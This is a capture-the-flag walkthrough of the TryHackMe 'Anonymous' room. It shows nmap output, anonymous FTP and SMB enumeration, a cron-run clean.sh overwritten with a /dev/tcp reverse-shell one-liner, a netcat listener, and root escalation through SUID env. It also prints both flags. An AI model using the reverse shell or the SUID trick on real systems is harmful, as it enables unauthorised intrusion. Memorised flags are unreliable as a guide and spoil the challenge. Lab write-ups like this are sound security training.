This is a medium challenge on TryHackMe.

The Nmap came up with

```diff
nmap -p- -A 10.10.3.37 -T4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-07 02:19 EDT
Warning: 10.10.3.37 giving up on port because retransmission cap hit (6).
Stats: 0:15:03 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 99.99% done; ETC: 02:35 (0:00:00 remaining)
Nmap scan report for 10.10.3.37
Host is up (0.21s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.17.3.108
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=8/7%OT=21%CT=1%CU=39908%PV=Y%DS=5%DC=T%G=Y%TM=66B31
OS:5BF%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A)SEQ(SP=
OS:FF%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M508ST11NW6%O2=M508ST11NW6%O
OS:3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST11NW6%O6=M508ST11)WIN(W1=F4B3%W2=
OS:F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M508NNSN
OS:W6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 5 hops
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2024-08-07T06:35:35+00:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: mean: 0s, deviation: 1s, median: -1s
| smb2-time: 
|   date: 2024-08-07T06:35:34
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

TRACEROUTE (using port 143/tcp)
HOP RTT       ADDRESS
1   57.86 ms  10.17.0.1
2   ... 4
5   170.41 ms 10.10.3.37

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 945.50 seconds

```

At first glance the FTP port and SMB ports look rewarding. So, first I decided to go with The FTP port with anonymous:anonymous as the credentials.

```diff
ftp 10.10.238.6
Connected to 10.10.238.6.
220 NamelessOne's FTP Server!
Name (10.10.238.6:whitedevil): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||23949|)
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
 226 Directory send OK.
ftp> cd scripts
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||34677|)
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000           53 Aug 07 09:52 clean.sh
-rw-rw-r--    1 1000     1000          903 Aug 07 09:52 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.
ftp> 
```
I downloaded all these three files and cat them out, we can see that clean.sh is a clean up script to delete files in the tmp directory. removed_files.log logs all the files deleted by the cleanup script. Now should also notice that we have all read,write and execute permissions as an anonymous user. This can come in hanndy later.

Now, I decided to explore the Samba shares.
```diff
└─# smbclient -L \\\\10.10.238.6
Password for [WORKGROUP\root]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        pics            Disk      My SMB Share Directory for Pics
        IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            ANONYMOUS

┌──(root㉿Den)-[/home/whitedevil/HTB_THM/Anonymous]
└─# smbclient \\\\10.10.238.6.\\pics
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun May 17 07:11:34 2020
  ..                                  D        0  Wed May 13 21:59:10 2020
  corgo2.jpg                          N    42663  Mon May 11 20:43:42 2020
  puppos.jpeg                         N   265188  Mon May 11 20:43:42 2020

                20508240 blocks of size 1024. 13289324 blocks available
smb: \> 


```

I downloaded both these files into my system and tried to analyze them, but no luck there!! Then the boxes name being "Anonymous", i figured there must be something to exploit within the FTP server's anonymous login. I looked for known ftp exploits but nothing useful. Then I took some hint from google and got to know that this clean.sh script is running on a cronjob. Now, that makes things interesting. If I could alter the script into a reverse-shell one-liner, then I could gain shell.

```diff
gedit clean.sh                                                                                                                                            
#!/bin/bash

sh -i >& /dev/tcp/10.17.3.108/9001 0>&1
```

I have mention my IP as the LHOST and port 9001 as the LPORT. Now I replace this script with the already existing clean.sh in the FTP  server and open up a listener in a different tab on port 9001.

```diff
nc -nvlp 9001                                                                                                                                        
listening on [any] 9001 ...
connect to [10.17.3.108] from (UNKNOWN) [10.10.238.6] 56442
sh: 0: can't access tty; job control turned off
$ cat user.txt
90d6f992585815ff991e68748c414740

```

For privilege escalation, I tried to list out the files with SUID privileges
```diff
$ find / -perm -04000 -type f 2>/dev/null
/tmp/bash
/bin/umount
/bin/fusermount
/bin/ping
/bin/mount
/bin/su
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/env
/usr/bin/gpasswd
/usr/bin/newuidmap
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/traceroute6.iputils
/usr/bin/at
/usr/bin/pkexec
```

Here, the interesting files are pkexec, at and env. Only env has a way for privilege escalation using SUID permissions.

```diff
$ env /bin/sh -p
whoami
root
cat /root/root.txt       
4d930091c31a622a7ed10f27999af363
```

Done and Dusted!!